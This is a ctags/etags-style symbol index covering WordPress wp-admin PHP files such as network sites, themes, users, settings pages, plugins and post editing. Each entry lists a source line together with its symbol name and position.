			foreach ( $editblog_roles as $role => $role_assoc ){role310,12075
				$name = translate_user_role( $role_assoc['name'] );name311,12131
				$selected = ( $role == $default_role ) ? 'selected="selected"' : '';selected312,12187

wordpress/wp-admin/network/sites.php,1506
$wp_list_table = _get_list_table('WP_MS_Sites_List_Table');wp_list_table19,393
$pagenum = $wp_list_table->get_pagenum();pagenum20,453
$title = __( 'Sites' );title22,496
$parent_file = 'sites.php';parent_file23,520
$id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;id49,2278
				$doaction = $_POST['action'] != -1 ? $_POST['action'] : $_POST['action2'];doaction81,3401
				$blogfunction = '';blogfunction82,3480
				foreach ( (array) $_POST['allblogs'] as $key => $val ) {key84,3505
								$blogfunction = 'all_delete';blogfunction90,3802
								$blogfunction = 'all_spam';blogfunction95,3915
								$blogfunction = 'all_notspam';blogfunction101,4068
$msg = '';msg239,8922
			$msg = __( 'Sites removed from spam.' );msg243,9096
			$msg = __( 'Sites marked as spam.' );msg246,9168
			$msg = __( 'Sites deleted.' );msg249,9239
			$msg = __( 'Site deleted.' );msg252,9299
			$msg = __( 'You do not have permission to delete that site.' );msg255,9363
			$msg = __( 'Site archived.' );msg258,9457
			$msg = __( 'Site unarchived.' );msg261,9520
			$msg = __( 'Site activated.' );msg264,9584
			$msg = __( 'Site deactivated.' );msg267,9649
			$msg = __( 'Site removed from spam.' );msg270,9712
			$msg = __( 'Site marked as spam.' );msg273,9779
			$msg = apply_filters( 'network_sites_updated_message_' . $_REQUEST['action'] , __( 'Settings saved.' ) );msg276,9839
		$msg = '<div class="updated" id="message"><p>' . $msg . '</p></div>';msg280,9973

wordpress/wp-admin/network/theme-editor.php,0

wordpress/wp-admin/network/theme-install.php,57
	define( 'IFRAME_REQUEST', true );IFRAME_REQUEST11,200

wordpress/wp-admin/network/themes.php,2015
$menu_perms = get_site_option( 'menu_items', array() );menu_perms16,281
$wp_list_table = _get_list_table('WP_MS_Themes_List_Table');wp_list_table24,574
$pagenum = $wp_list_table->get_pagenum();pagenum25,635
$action = $wp_list_table->current_action();action27,678
$s = isset($_REQUEST['s']) ? $_REQUEST['s'] : '';s29,723
$temp_args = array( 'enabled', 'disabled', 'deleted', 'error' );temp_args32,871
$referer = remove_query_arg( $temp_args, wp_get_referer() );referer34,1019
	$allowed_themes = get_site_option( 'allowedthemes' );allowed_themes37,1098
			$themes = isset( $_POST['checked'] ) ? (array) $_POST['checked'] : array();themes58,1906
			$themes = isset( $_POST['checked'] ) ? (array) $_POST['checked'] : array();themes71,2396
				$themes = explode( ',', $_GET['themes'] );themes86,2927
				$themes = (array) $_POST['checked'];themes88,3015
				$themes = array();themes90,3064
			$title = __( 'Update Themes' );title92,3088
			$parent_file = 'themes.php';parent_file93,3123
			$url = self_admin_url('update.php?action=update-selected-themes&amp;themes=' . urlencode( join(',', $themes) ));url101,3309
			$url = wp_nonce_url($url, 'bulk-update-themes');url102,3425
			$themes = isset( $_REQUEST['checked'] ) ? (array) $_REQUEST['checked'] : array();themes114,3871
			$files_to_delete = $theme_info = array();files_to_delete123,4159
			foreach ( $themes as $key => $theme ) {key124,4204
				$files_to_delete = array_merge( $files_to_delete, list_files( $theme_info[ $theme ]->get_stylesheet_directory() ) );files_to_delete126,4299
			$parent_file = 'themes.php';parent_file136,4585
					$themes_to_delete = count( $themes );themes_to_delete144,4801
				$delete_result = delete_theme( $theme, esc_url( add_query_arg( array('verify-delete' => 1), $_SERVER['REQUEST_URI'] ) ) );delete_result185,7046
			$paged = ( $_REQUEST['paged'] ) ? $_REQUEST['paged'] : 1;paged186,7173
$title = __('Themes');title214,8693
$parent_file = 'themes.php';parent_file215,8716

wordpress/wp-admin/network/update-core.php,0

wordpress/wp-admin/network/update.php,57
	define( 'IFRAME_REQUEST', true );IFRAME_REQUEST11,278

wordpress/wp-admin/network/upgrade.php,741
$title = __( 'Update Network' );title18,330
$parent_file = 'upgrade.php';parent_file19,363
$action = isset($_GET['action']) ? $_GET['action'] : 'show';action45,1704
		$n = ( isset($_GET['n']) ) ? intval($_GET['n']) : 0;n49,1804
		$blogs = $wpdb->get_results( "SELECT * FROM {$wpdb->blogs} WHERE site_id = '{$wpdb->siteid}' AND spam = '0' AND deleted = '0' AND archived = '0' ORDER BY registered DESC LIMIT {$n}, 5", ARRAY_A );blogs56,1971
			$siteurl = get_blog_option( $details['blog_id'], 'siteurl' );siteurl63,2313
			$response = wp_remote_get( trailingslashit( $siteurl ) . "wp-admin/upgrade.php?step=upgrade_db", array( 'timeout' => 120, 'httpversion' => '1.1' ) );response65,2407
		function nextpage() {nextpage75,3194

wordpress/wp-admin/network/user-edit.php,0

wordpress/wp-admin/network/user-new.php,646
	$user = $_POST['user'];user41,1667
	$user_details = wpmu_validate_user_signup( $user['username'], $user['email'] );user_details43,1693
		$add_user_errors = $user_details[ 'errors' ];add_user_errors45,1873
		$password = wp_generate_password( 12, false);password47,1931
		$user_id = wpmu_create_user( esc_html( strtolower( $user['username'] ) ), $password, esc_html( $user['email'] ) );user_id48,1979
	 		$add_user_errors = new WP_Error( 'add_user_fail', __( 'Cannot add user.' ) );add_user_errors51,2119
	$messages = array();messages61,2394
$title = __('Add New User');title66,2489
$parent_file = 'users.php';parent_file67,2518

wordpress/wp-admin/network/users.php,2640
function confirm_delete_users( $users ) {confirm_delete_users19,401
	$current_user = wp_get_current_user();current_user20,443
	$site_admins = get_super_admins();site_admins32,817
	$admin_out = "<option value='$current_user->ID'>$current_user->user_login</option>";admin_out33,853
	foreach ( ( $allusers = (array) $_POST['allusers'] ) as $key => $val ) {allusers35,940
			$delete_user = new WP_User( $val );delete_user37,1051
			$blogs = get_blogs_of_user( $val, true );blogs46,1512
				foreach ( (array) $blogs as $key => $details ) {key52,1765
					$blog_users = get_users( array( 'blog_id' => $details->userblog_id ) );blog_users53,1818
						$user_site = "<a href='" . esc_url( get_home_url( $details->userblog_id ) ) . "'>{$details->blogname}</a>";user_site55,1958
						$user_dropdown = "<select name='blog[$val][{$key}]'>";user_dropdown56,2072
						$user_list = '';user_list57,2133
							$user_list = $admin_out;user_list63,2366
			$id = intval( $_GET['id'] );id99,3530
				$title = __( 'Users' );title102,3692
				$parent_file = 'users.php';parent_file103,3720
				$doaction = $_POST['action'] != -1 ? $_POST['action'] : $_POST['action2'];doaction122,4334
				$userfunction = '';userfunction123,4413
				foreach ( (array) $_POST['allusers'] as $key => $val ) {key125,4438
								$title = __( 'Users' );title131,4707
								$parent_file = 'users.php';parent_file132,4739
								$user = new WP_User( $val );user142,5030
								$userfunction = 'all_spam';userfunction146,5277
								$blogs = get_blogs_of_user( $val, true );blogs147,5313
								foreach ( (array) $blogs as $key => $details ) {key148,5363
								$userfunction = 'all_notspam';userfunction156,5675
								$blogs = get_blogs_of_user( $val, true );blogs157,5714
								foreach ( (array) $blogs as $key => $details )key158,5764
				$location = network_admin_url( 'users.php' );location169,6100
					$location = add_query_arg( 'paged', (int) $_REQUEST['paged'], $location );location172,6192
				foreach ( $_POST['blog'] as $id => $users ) {id184,6629
					foreach ( $users as $blogid => $user_id ) {blogid185,6679
			$i = 0;i196,7020
			if ( $i == 1 )i205,7253
				$deletefunction = 'delete';deletefunction206,7271
				$deletefunction = 'all_delete';deletefunction208,7311
$wp_list_table = _get_list_table('WP_MS_Users_List_Table');wp_list_table216,7502
$pagenum = $wp_list_table->get_pagenum();pagenum217,7562
$total_pages = $wp_list_table->get_pagination_arg( 'total_pages' );total_pages219,7637
$title = __( 'Users' );title225,7824
$parent_file = 'users.php';parent_file226,7848

wordpress/wp-admin/network.php,5253
define( 'WP_INSTALLING_NETWORK', true );WP_INSTALLING_NETWORK13,220
foreach ( $wpdb->tables( 'ms_global' ) as $table => $prefixed_table )table31,761
function network_domain_check() {network_domain_check40,964
function allow_subdomain_install() {allow_subdomain_install53,1282
	$domain = preg_replace( '|https?://([^/]+)|', '$1', get_option( 'siteurl' ) );domain54,1319
function allow_subdirectory_install() {allow_subdirectory_install66,1672
	$post = $wpdb->get_row( "SELECT ID FROM $wpdb->posts WHERE post_date < DATE_SUB(NOW(), INTERVAL 1 MONTH) AND post_status = 'publish'" );post74,1898
function get_clean_basedomain() {get_clean_basedomain86,2181
	if ( $existing_domain = network_domain_check() )existing_domain87,2215
	$domain = preg_replace( '|https?://|', '', get_option( 'siteurl' ) );domain89,2292
	if ( $slash = strpos( $domain, '/' ) )slash90,2363
		$domain = substr( $domain, 0, $slash );domain91,2403
	$title = __( 'Network Setup' );title99,2739
	$parent_file = 'settings.php';parent_file100,2772
	$title = __( 'Create a Network of WordPress Sites' );title102,2813
	$parent_file = 'tools.php';parent_file103,2868
$network_help = '<p>' . __('This screen allows you to configure a network as having subdomains (<code>site1.example.com</code>) or subdirectories (<code>example.com/site1</code>). Subdomains require wildcard subdomains to be enabled in Apache and DNS records, if your host allows it.') . '</p>' .network_help106,2900
function network_step1( $errors = false ) {network_step1144,6204
function network_step1( $errors = false ) {errors144,6204
	$active_plugins = get_option( 'active_plugins' );active_plugins161,7030
	$hostname = get_clean_basedomain();hostname169,7529
	$has_ports = strstr( $hostname, ':' );has_ports170,7566
	$error_codes = array();error_codes184,8218
		$error_codes = $errors->get_error_codes();error_codes190,8482
	$site_name = ( ! empty( $_POST['sitename'] ) && ! in_array( 'empty_sitename', $error_codes ) ) ? $_POST['sitename'] : sprintf( _x('%s Sites', 'Default network name' ), get_option( 'blogname' ) );site_name196,8752
	$admin_email = ( ! empty( $_POST['email'] ) && ! in_array( 'invalid_email', $error_codes ) ) ? $_POST['email'] : get_option( 'admin_email' );admin_email197,8949
		$subdomain_install = (bool) $_POST['subdomain_install'];subdomain_install204,9405
		$subdomain_install = true;subdomain_install206,9531
		$subdomain_install = true;subdomain_install208,9606
		$subdomain_install = false;subdomain_install210,9645
		if ( $got_mod_rewrite = got_mod_rewrite() ) // dangerous assumptionsgot_mod_rewrite211,9675
		$is_www = ( 0 === strpos( $hostname, 'www.' ) );is_www238,11770
function network_step2( $errors = false ) {network_step2316,15165
function network_step2( $errors = false ) {errors316,15165
	$hostname = get_clean_basedomain();hostname318,15231
		$base = trailingslashit( stripslashes( dirname( dirname( $_SERVER['SCRIPT_NAME'] ) ) ) );base321,15294
			$subdomain_install = allow_subdirectory_install() ? ! empty( $_POST['subdomain_install'] ) : true;subdomain_install329,15569
			$subdomain_install = false;subdomain_install331,15678
			$subdomain_install = is_subdomain_install();subdomain_install334,15745
			$subdomain_install = (bool) $wpdb->get_var( "SELECT meta_value FROM $wpdb->sitemeta WHERE site_id = 1 AND meta_key = 'subdomain_install'" );subdomain_install339,15902
define('MULTISITE', true);MULTISITE370,17921
define('SUBDOMAIN_INSTALL', <?php echo $subdomain_install ? 'true' : 'false'; ?>);SUBDOMAIN_INSTALL371,17948
$base = '<?php echo $base; ?>';base372,18031
define('DOMAIN_CURRENT_SITE', '<?php echo $hostname; ?>');DOMAIN_CURRENT_SITE373,18063
define('PATH_CURRENT_SITE', '<?php echo $base; ?>');PATH_CURRENT_SITE374,18122
define('SITE_ID_CURRENT_SITE', 1);SITE_ID_CURRENT_SITE375,18175
define('BLOG_ID_CURRENT_SITE', 1);</textarea>BLOG_ID_CURRENT_SITE376,18210
	$keys_salts = array( 'AUTH_KEY' => '', 'SECURE_AUTH_KEY' => '', 'LOGGED_IN_KEY' => '', 'NONCE_KEY' => '', 'AUTH_SALT' => '', 'SECURE_AUTH_SALT' => '', 'LOGGED_IN_SALT' => '', 'NONCE_SALT' => '' );keys_salts378,18262
	foreach ( $keys_salts as $c => $v ) {c379,18460
		$keys_salts_str = '';keys_salts_str384,18589
		$from_api = wp_remote_get( 'https://api.wordpress.org/secret-key/1.1/salt/' );from_api385,18613
			foreach ( $keys_salts as $c => $v ) {c387,18730
			$from_api = explode( "\n", wp_remote_retrieve_body( $from_api ) );from_api391,18881
			foreach ( $keys_salts as $c => $v ) {c392,18951
		$num_keys_salts = count( $keys_salts );num_keys_salts396,19099
				$web_config_file =web_config_file409,19701
				$web_config_file =web_config_file440,21112
		$htaccess_file = 'RewriteEngine Onhtaccess_file492,23687
	$base = trailingslashit( stripslashes( dirname( dirname( $_SERVER['SCRIPT_NAME'] ) ) ) );base528,25195
	$hostname = get_clean_basedomain();hostname535,25439
	$subdomain_install = allow_subdomain_install() ? !empty( $_POST['subdomain_install'] ) : false;subdomain_install536,25476
		$result = populate_network( 1, get_clean_basedomain(), sanitize_email( $_POST['email'] ), stripslashes( $_POST['sitename'] ), $base, $subdomain_install );result538,25608

wordpress/wp-admin/options-discussion.php,1681
$title = __('Discussion Settings');title15,326
$parent_file = 'options-general.php';parent_file16,362
$maxdeep = (int) apply_filters( 'thread_comments_depth_max', 10 );maxdeep80,4217
$thread_comments_depth = '</label><select name="thread_comments_depth" id="thread_comments_depth">';thread_comments_depth82,4285
for ( $i = 2; $i <= $maxdeep; $i++ ) {i83,4386
$default_comments_page = '</label><label for="default_comments_page"><select name="default_comments_page" id="default_comments_page"><option value="newest"';default_comments_page97,4940
$comment_order = '<select name="comment_order" id="comment_order"><option value="asc"';comment_order109,5862
	$yesorno = array( 0 => __( 'Don&#8217;t show Avatars' ), 1 => __( 'Show Avatars' ) );yesorno176,10235
	foreach ( $yesorno as $key => $value) {key177,10322
		$selected = (get_option('show_avatars') == $key) ? 'checked="checked"' : '';selected178,10363
$ratings = array(ratings189,10775
foreach ($ratings as $key => $rating) :key199,11321
	$selected = (get_option('avatar_rating') == $key) ? 'checked="checked"' : '';selected200,11361
$avatar_defaults = array(avatar_defaults214,11971
$avatar_defaults = apply_filters('avatar_defaults', $avatar_defaults);avatar_defaults223,12269
$default = get_option('avatar_default');default224,12340
	$default = 'mystery';default226,12404
$size = 32;size227,12427
$avatar_list = '';avatar_list228,12439
foreach ( $avatar_defaults as $default_key => $default_name ) {default_key229,12458
	$selected = ($default == $default_key) ? 'checked="checked" ' : '';selected230,12522
	$avatar = get_avatar( $user_email, $size, $default_key );avatar233,12746

wordpress/wp-admin/options-general.php,1783
$title = __('General Settings');title15,323
$parent_file = 'options-general.php';parent_file16,356
$timezone_format = _x('Y-m-d G:i:s', 'timezone date format');timezone_format18,506
function add_js() {add_js26,676
$options_help = '<p>' . __('The fields on this screen determine some of the basics of your site setup.') . '</p>' .options_help61,2012
$new_admin_email = get_option( 'new_admin_email' );new_admin_email138,6793
$current_offset = get_option('gmt_offset');current_offset149,7229
$tzstring = get_option('timezone_string');tzstring150,7273
$check_zone_info = true;check_zone_info152,7317
	$tzstring = '';tzstring156,7440
	$check_zone_info = false;check_zone_info159,7536
		$tzstring = 'UTC+0';tzstring161,7592
		$tzstring = 'UTC' . $current_offset;tzstring163,7645
		$tzstring = 'UTC+' . $current_offset;tzstring165,7690
	$now = localtime(time(), true);now187,8533
	$allowed_zones = timezone_identifiers_list();allowed_zones195,8731
		$found = false;found198,8826
		$date_time_zone_selected = new DateTimeZone($tzstring);date_time_zone_selected199,8844
		$tz_offset = timezone_offset_get($date_time_zone_selected, date_create());tz_offset200,8902
		$right_now = time();right_now201,8979
			    $found = true;found204,9110
			$message = $tr['isdst'] ?message211,9184
	$date_formats = apply_filters( 'date_formats', array(date_formats234,9934
	$custom = true;custom241,10045
			$custom = false;custom247,10349
	$time_formats = apply_filters( 'time_formats', array(time_formats267,11244
	$custom = true;custom273,11341
			$custom = false;custom279,11645
	$selected = (get_option('start_of_week') == $day_index) ? 'selected="selected"' : '';selected297,12443
	$languages = get_available_languages();languages305,12740

wordpress/wp-admin/options-head.php,0

wordpress/wp-admin/options-media.php,290
$title = __('Media Settings');title15,321
$parent_file = 'options-general.php';parent_file16,352
$media_options_help = '<p>' . __('You can set maximum sizes for images inserted into your written content; you can also insert an image as Full Size.') . '</p>' .media_options_help18,391

wordpress/wp-admin/options-permalink.php,2094
$title = __('Permalink Settings');title15,326
$parent_file = 'options-general.php';parent_file16,361
function add_js() {add_js55,3351
$home_path = get_home_path();home_path77,3813
$iis7_permalinks = iis7_supports_permalinks();iis7_permalinks78,3843
$prefix = $blog_prefix = '';prefix80,3891
	$prefix = '/index.php';prefix82,3969
	$blog_prefix = '/blog';blog_prefix84,4061
			$permalink_structure = $_POST['selection'];permalink_structure91,4332
			$permalink_structure = $_POST['permalink_structure'];permalink_structure93,4386
			$permalink_structure = preg_replace( '#/+#', '/', '/' . str_replace( '#', '', $permalink_structure ) );permalink_structure96,4487
				$permalink_structure = $prefix . preg_replace( '#^/?index\.php#', '', $permalink_structure );permalink_structure98,4628
				$permalink_structure = $blog_prefix . $permalink_structure;permalink_structure100,4734
		$category_base = $_POST['category_base'];category_base106,4913
			$category_base = $blog_prefix . preg_replace('#/+#', '/', '/' . str_replace( '#', '', $category_base ) );category_base108,4992
		$tag_base = $_POST['tag_base'];tag_base113,5195
			$tag_base = $blog_prefix . preg_replace('#/+#', '/', '/' . str_replace( '#', '', $tag_base ) );tag_base115,5259
$permalink_structure = get_option('permalink_structure');permalink_structure122,5437
$category_base = get_option('category_base');category_base123,5495
$tag_base = get_option( 'tag_base' );tag_base124,5541
		$writable = true;writable128,5736
		$writable = false;writable130,5762
		$writable = true;writable133,5912
		$writable = false;writable135,5938
	$usingpi = true;usingpi139,6007
	$usingpi = false;usingpi141,6030
	$permalink_structure = preg_replace( '|^/?blog|', '', $permalink_structure );permalink_structure179,7513
	$category_base = preg_replace( '|^/?blog|', '', $category_base );category_base180,7592
	$tag_base = preg_replace( '|^/?blog|', '', $tag_base );tag_base181,7659
$structures = array(structures184,7719
$suffix = '';suffix229,10332
	$suffix = 'index.php/';suffix231,10388

wordpress/wp-admin/options-privacy.php,103
$title = __('Privacy Settings');title15,337
$parent_file = 'options-general.php';parent_file16,370

wordpress/wp-admin/options-reading.php,193
$title = __( 'Reading Settings' );title15,325
$parent_file = 'options-general.php';parent_file16,360
function add_js() {add_js24,506
			check_disabled = function(){check_disabled32,748

wordpress/wp-admin/options-writing.php,679
$title = __('Writing Settings');title15,323
$parent_file = 'options-general.php';parent_file16,356
	$post_email_help = '<p>' . __('Due to security issues, you cannot use Post By Email on Multisite Installs.') . '</p>';post_email_help32,1610
	$post_email_help = '<p>' . __('Post via email settings allow you to send your WordPress install an email with the content of your post. You must set up a secret e-mail account with POP3 access to use this, and any mail received at this address will be posted, so it&#8217;s a good idea to keep this address very secret.') . '</p>';post_email_help34,1739
	$post_formats = get_theme_support( 'post-formats' );post_formats96,4682

wordpress/wp-admin/options.php,2041
$title = __('Settings');title21,668
$this_file = 'options.php';this_file22,693
$parent_file = 'options-general.php';parent_file23,721
$capability = 'manage_options';capability27,808
	$option_page = 'options';option_page30,927
	$capability = apply_filters( "option_page_capability_{$option_page}", $capability );capability32,959
		$new_admin_details = get_option( 'adminhash' );new_admin_details40,1225
		$redirect = 'options-general.php?updated=false';redirect41,1275
			$redirect = 'options-general.php?updated=true';redirect46,1609
$whitelist_options = array(whitelist_options61,2050
$mail_options = array('mailserver_url', 'mailserver_port', 'mailserver_login', 'mailserver_pass');mail_options70,3421
$uploads_options = array('uploads_use_yearmonth_folders', 'upload_path', 'upload_url_path');uploads_options71,3520
$whitelist_options = apply_filters( 'whitelist_options', $whitelist_options );whitelist_options98,4548
		$unregistered = true;unregistered105,4877
		$unregistered = false;unregistered108,4954
		$options = explode( ',', stripslashes( $_POST[ 'page_options' ] ) );options118,5348
		$options = $whitelist_options[ $option_page ];options120,5429
			$option = trim($option);option142,6592
			$value = null;value143,6620
				$value = $_POST[$option];value145,6671
				$value = trim($value);value147,6729
			$value = stripslashes_deep($value);value148,6756
	$goback = add_query_arg( 'settings-updated', 'true',  wp_get_referer() );goback164,7235
$options = $wpdb->get_results( "SELECT * FROM $wpdb->options ORDER BY option_name" );options180,7740
	$disabled = false;disabled183,7869
			$value = maybe_unserialize( $option->option_value );value189,8101
			$class = 'all-options';class191,8205
			$value = 'SERIALIZED DATA';value193,8243
			$disabled = true;disabled194,8274
			$class = 'all-options disabled';class195,8295
		$value = $option->option_value;value198,8345
		$class = 'all-options';class200,8426
	$name = esc_attr( $option->option_name );name202,8455

wordpress/wp-admin/plugin-editor.php,2252
$title = __("Edit Plugins");title20,434
$parent_file = 'plugins.php';parent_file21,463
$plugins = get_plugins();plugins25,593
	$plugin = stripslashes($_REQUEST['file']);plugin31,739
	$plugin = array_keys($plugins);plugin34,808
	$plugin = $plugin[0];plugin35,841
$plugin_files = get_plugin_files($plugin);plugin_files38,867
	$file = $plugin_files[0];file41,931
	$file = stripslashes($file);file43,963
$file = validate_file_to_edit($file, $plugin_files);file45,994
$real_file = WP_PLUGIN_DIR . '/' . $file;real_file46,1047
$scrollto = isset($_REQUEST['scrollto']) ? (int) $_REQUEST['scrollto'] : 0;scrollto47,1089
	$newcontent = stripslashes($_POST['newcontent']);newcontent55,1251
		$f = fopen($real_file, 'w+');f57,1337
		$network_wide = is_plugin_active_for_network( $file );network_wide61,1411
				update_option( 'recently_activated', array( $file => time() ) + (array) get_option( 'recently_activated' ) );file69,1671
		$error = validate_plugin($file);error87,2283
	$editable_extensions = array('php', 'txt', 'text', 'js', 'css', 'html', 'htm', 'xml', 'inc', 'include');editable_extensions99,2802
	$editable_extensions = (array) apply_filters('editable_extensions', $editable_extensions);editable_extensions100,2908
			$ext = strtolower($matches[1]);ext107,3235
	$content = file_get_contents( $real_file );content136,5304
		$functions = wp_doc_link_parse( $content );functions139,5419
			$docs_select = '<select name="docs-list" id="docs-list">';docs_select142,5496
	$content = esc_textarea( $content );content151,5839
	foreach ( $plugins as $plugin_key => $a_plugin ) {plugin_key188,7354
		$plugin_name = $a_plugin['Name'];plugin_name189,7406
		if ( $plugin_key == $plugin )plugin_key190,7442
			$selected = " selected='selected'";selected191,7474
			$selected = '';selected193,7520
		$plugin_name = esc_attr($plugin_name);plugin_name194,7539
		$plugin_key = esc_attr($plugin_key);plugin_key195,7580
		$ext = strtolower($matches[1]);ext214,8044
		<li<?php echo $file == $plugin_file ? ' class="highlight"' : ''; ?>><a href="plugin-editor.php?file=<?php echo urlencode( $plugin_file ) ?>&amp;plugin=<?php echo urlencode( $plugin ) ?>"><?php echo $plugin_file ?></a></li>file223,8249

wordpress/wp-admin/plugin-install.php,327
	define( 'IFRAME_REQUEST', true );IFRAME_REQUEST10,300
$wp_list_table = _get_list_table('WP_Plugin_Install_List_Table');wp_list_table23,661
$pagenum = $wp_list_table->get_pagenum();pagenum24,727
$title = __('Install Plugins');title27,803
$parent_file = 'plugins.php';parent_file28,835
$body_id = $tab;body_id34,959

wordpress/wp-admin/plugins.php,4449
	$menu_perms = get_site_option( 'menu_items', array() );menu_perms13,199
$wp_list_table = _get_list_table('WP_Plugins_List_Table');wp_list_table22,528
$pagenum = $wp_list_table->get_pagenum();pagenum23,587
$action = $wp_list_table->current_action();action25,630
$plugin = isset($_REQUEST['plugin']) ? $_REQUEST['plugin'] : '';plugin27,675
$s = isset($_REQUEST['s']) ? urlencode($_REQUEST['s']) : '';s28,740
			$result = activate_plugin($plugin, self_admin_url('plugins.php?error=true&plugin=' . $plugin), is_network_admin() );result42,1333
					$redirect = self_admin_url('plugins.php?error=true&charsout=' . strlen($result->get_error_data()) . '&plugin=' . $plugin . "&plugin_status=$status&paged=$page&s=$s");redirect45,1550
				$recent = (array) get_option( 'recently_activated' );recent59,2083
			$plugins = isset( $_POST['checked'] ) ? (array) $_POST['checked'] : array();plugins77,2895
				foreach ( $plugins as $i => $plugin ) {i81,3065
				foreach ( $plugins as $i => $plugin ) {i86,3210
				$recent = (array) get_option('recently_activated' );recent100,3635
				$plugins = explode( ',', $_GET['plugins'] );plugins114,4054
				$plugins = (array) $_POST['checked'];plugins116,4144
				$plugins = array();plugins118,4194
			$title = __( 'Update Plugins' );title120,4219
			$parent_file = 'plugins.php';parent_file121,4255
			$url = self_admin_url('update.php?action=update-selected&amp;plugins=' . urlencode( join(',', $plugins) ));url129,4442
			$url = wp_nonce_url($url, 'bulk-update-plugins');url130,4553
			$valid = validate_plugin($plugin);valid143,5021
			function plugin_sandbox_scrape( $plugin ) {plugin_sandbox_scrape153,5445
				update_option( 'recently_activated', array( $plugin => time() ) + (array) get_option( 'recently_activated' ) );plugin173,6132
			$plugins = isset( $_POST['checked'] ) ? (array) $_POST['checked'] : array();plugins186,6768
				$plugins = array_filter( $plugins, 'is_plugin_active_for_network' );plugins189,6942
				$plugins = array_filter( $plugins, 'is_plugin_active' );plugins191,7027
				$plugins = array_diff( $plugins, array_filter( $plugins, 'is_plugin_active_for_network' ) );plugins192,7088
				$deactivated = array();deactivated202,7419
			//$_POST = from the plugin form; $_GET = from the FTP details screen._GET217,7965
			$plugins = isset( $_REQUEST['checked'] ) ? (array) $_REQUEST['checked'] : array();plugins218,8038
			$plugins = array_filter($plugins, 'is_plugin_inactive'); // Do not allow to delete Activated plugins.plugins224,8259
			$parent_file = 'plugins.php';parent_file232,8568
					$files_to_delete = $plugin_info = array();files_to_delete240,8779
					$have_non_network_plugins = false;have_non_network_plugins241,8827
							if( $data = get_plugin_data(WP_PLUGIN_DIR . '/' . $plugin) ) {data245,9012
									$have_non_network_plugins = true;have_non_network_plugins249,9265
							$files = list_files( WP_PLUGIN_DIR . '/' . dirname($plugin) );files253,9378
								$files_to_delete = array_merge($files_to_delete, $files);files_to_delete255,9471
							if ( $folder_plugins = get_plugins( '/' . dirname($plugin)) ) {folder_plugins258,9590
								foreach( $folder_plugins as $plugin_file => $data ) {plugin_file259,9661
										$have_non_network_plugins = true;have_non_network_plugins263,9975
					$plugins_to_delete = count( $plugin_info );plugins_to_delete269,10073
						$data_to_delete = false;data_to_delete278,10739
								$data_to_delete = true;data_to_delete283,11112
			$delete_result = delete_plugins($plugins);delete_result325,12910
$title = __('Plugins');title366,15505
$parent_file = 'plugins.php';parent_file367,15529
$invalid = validate_active_plugins();invalid371,15614
	foreach ( $invalid as $plugin_file => $error )plugin_file373,15676
		$errmsg = __( 'You cannot delete a plugin while it is active on the main site.' );errmsg380,16013
		$errmsg = sprintf(__('The plugin generated %d characters of <strong>unexpected output</strong> during activation. If you notice &#8220;headers already sent&#8221; messages, problems with syndication feeds or other issues, try deactivating or removing this plugin.'), $_GET['charsout']);errmsg382,16135
		$errmsg = __('Plugin could not be activated because it triggered a <strong>fatal error</strong>.');errmsg384,16430
		$delete_result = get_transient('plugins_delete_result_'.$user_ID);delete_result395,17024

wordpress/wp-admin/post-new.php,737
	$post_type = 'post';post_type13,216
	$post_type = $_GET['post_type'];post_type15,325
$post_type_object = get_post_type_object( $post_type );post_type_object19,401
	$parent_file = 'edit.php';parent_file22,488
	$submenu_file = 'post-new.php';submenu_file23,516
	$submenu_file = "post-new.php?post_type=$post_type";submenu_file25,558
		$parent_file = $post_type_object->show_in_menu;parent_file27,728
			$submenu_file = $parent_file;submenu_file29,917
		$parent_file = "edit.php?post_type=$post_type";parent_file31,960
$title = $post_type_object->labels->add_new_item;title35,1016
$editing = true;editing37,1067
$post = get_default_post_to_edit( $post_type, true );post49,1408
$post_ID = $post->ID;post_ID50,1462

wordpress/wp-admin/post.php,2993
$parent_file = 'edit.php';parent_file14,229
$submenu_file = 'edit.php';submenu_file15,256
 	$post_id = $post_ID = (int) $_GET['post'];post_id20,536
 	$post_id = $post_ID = (int) $_POST['post_ID'];post_id22,619
 	$post_id = $post_ID = 0;post_id24,673
$post = $post_type = $post_type_object = null;post26,701
	$post = get_post( $post_id );post29,765
	$post_type = $post->post_type;post_type32,812
	$post_type_object = get_post_type_object( $post_type );post_type_object33,844
function redirect_post($post_id = '') {redirect_post41,987
		$status = get_post_status( $post_id );status43,1087
					$message = 8;message48,1211
					$message = 9;message51,1261
					$message = 6;message54,1305
				$message = 'draft' == $status ? 10 : 1;message57,1340
		$location = add_query_arg( 'message', $message, get_edit_post_link( $post_id, 'url' ) );location60,1389
		$location = add_query_arg( 'message', 2, wp_get_referer() );location62,1542
		$location = explode('#', $location);location63,1605
		$location = $location[0] . '#postcustom';location64,1644
		$location = add_query_arg( 'message', 3, wp_get_referer() );location66,1756
		$location = explode('#', $location);location67,1819
		$location = $location[0] . '#postcustom';location68,1858
		$location = "post.php?action=edit&post=$post_id&message=7";location70,1966
		$location = add_query_arg( 'message', 4, get_edit_post_link( $post_id, 'url' ) );location72,2038
	$action = 'delete';action80,2253
	$action = 'preview';action82,2352
$sendback = wp_get_referer();sendback84,2375
	$sendback = admin_url( 'edit.php' );sendback88,2530
	$sendback = remove_query_arg( array('trashed', 'untrashed', 'deleted', 'ids'), $sendback );sendback91,2652
		$post_id = edit_post();post_id107,3228
		$post_id = 'postajaxpost' == $action ? edit_post() : write_post();post_id109,3264
	$editing = true;editing125,3626
	$p = $post_id;p132,3727
	$post_type = $post->post_type;post_type146,4222
		$parent_file = "edit.php";parent_file148,4285
		$submenu_file = "edit.php";submenu_file149,4314
		$post_new_file = "post-new.php";post_new_file150,4344
			$parent_file = $post_type_object->show_in_menu;parent_file153,4504
			$parent_file = "edit.php?post_type=$post_type";parent_file155,4562
		$submenu_file = "edit.php?post_type=$post_type";submenu_file156,4613
		$post_new_file = "post-new.php?post_type=$post_type";post_new_file157,4664
	if ( $last = wp_check_post_lock( $post->ID ) ) {last160,4724
		$active_post_lock = wp_set_post_lock( $post->ID );active_post_lock163,4845
	$title = $post_type_object->labels->edit_item;title167,4935
	$post = get_post_to_edit($post_id);post168,4983
	$newmeta = wp_get_attachment_metadata( $post_id, true );newmeta187,5403
	$post_id = edit_post();post_id195,5636
	$post = & get_post($post_id);post205,5832
	$force = !EMPTY_TRASH_DAYS;force236,6799
		$force = ( $force || !MEDIA_TRASH );force238,6871
	$url = post_preview();url253,7239

wordpress/wp-admin/press-this.php,5350
define('IFRAME_REQUEST' , true);IFRAME_REQUEST9,101
function press_it() {press_it28,511
